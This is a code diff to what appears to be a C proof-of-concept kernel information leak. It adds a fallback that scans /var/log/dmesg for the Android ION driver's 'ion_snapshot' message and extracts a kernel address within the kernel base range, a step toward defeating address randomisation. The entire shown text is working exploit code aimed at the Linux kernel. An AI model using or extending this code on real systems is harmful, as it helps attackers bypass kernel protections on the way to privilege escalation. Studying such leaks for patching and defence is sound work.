@@ -8,7 +8,8 @@
 // Android ION drivers were removed in kernel v5.11-rc1.
 //
 // Requires:
-// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
+// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
+//   readable /var/log/dmesg.
 //
 // References:
 // https://lwn.net/Articles/576966/
@@ -64,8 +65,55 @@ unsigned long search_dmesg_ion_snapshot() {
   return 0;
 }
 
+unsigned long search_dmesg_log_file_ion_snapshot() {
+  FILE *f;
+  char *endptr;
+  char *substr;
+  char *addr_buf;
+  char *line_buf;
+  const char *path = "/var/log/dmesg";
+  const char *needle1 = "ion_snapshot: ";
+  const char *needle2 = "and copy to 0x";
+  unsigned long addr = 0;
+  char buff[BUFSIZ];
+
+  printf("[.] searching %s for '%s' ...\n", path, needle1);
+
+  f = fopen(path, "rb");
+  if (f == NULL) {
+    perror("[-] fopen");
+    return 0;
+  }
+
+  while ((fgets(buff, BUFSIZ, f)) != NULL) {
+    substr = strstr(buff, needle1);
+    if (substr == NULL)
+      continue;
+
+    line_buf = strtok(substr, "\n");
+    if (line_buf == NULL)
+      break;
+
+    addr_buf = strstr(substr, needle2);
+    if (addr_buf == NULL)
+      break;
+
+    addr = strtoul(&addr_buf[strlen(needle2)], &endptr, 16);
+
+    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+      break;
+  }
+
+  fclose(f);
+
+  return addr;
+}
+
 int main() {
   unsigned long addr = search_dmesg_ion_snapshot();
+  if (!addr)
+    addr = search_dmesg_log_file_ion_snapshot();
+
   if (!addr)
     return 1;
 
